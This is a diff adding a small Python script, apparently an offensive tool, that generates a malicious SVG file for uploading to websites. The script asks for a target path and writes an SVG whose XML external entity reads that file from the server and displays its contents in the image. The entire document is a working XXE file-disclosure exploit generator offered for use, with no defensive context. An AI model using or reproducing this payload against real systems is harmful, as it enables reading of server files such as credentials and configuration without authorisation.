@@ -1,0 +1,10 @@
+print("MaliciousSvgFileGenerator")
+target_file = input("path of the file to be read > ")
+print("If the website is manipulating the size of the svg file, these parameters should be given carefully.")
+width = input("width > ")
+height = input("height > ")
+payload = '<?xml version="1.0" standalone="yes"?><!DOCTYPE pwn [ <!ENTITY file SYSTEM "file://' +target_file + '" > ]><svg width="' + width + '" height="' + height+ '" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&file;</text></svg>'
+output_name=input("malicious file name > ")
+file = open(output_name,"w")
+file.write(payload)
+file.close()
